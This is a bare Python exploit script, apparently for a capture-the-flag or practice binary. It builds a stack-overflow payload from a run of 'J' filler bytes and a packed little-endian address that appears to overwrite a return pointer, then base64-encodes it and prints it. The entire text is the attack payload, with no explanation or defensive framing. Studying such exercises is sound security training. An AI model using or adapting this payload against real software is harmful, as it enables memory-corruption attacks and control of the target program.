
import sys
import struct
import base64

buf = b'JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ'
buf += struct.pack('<I', 275308676)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
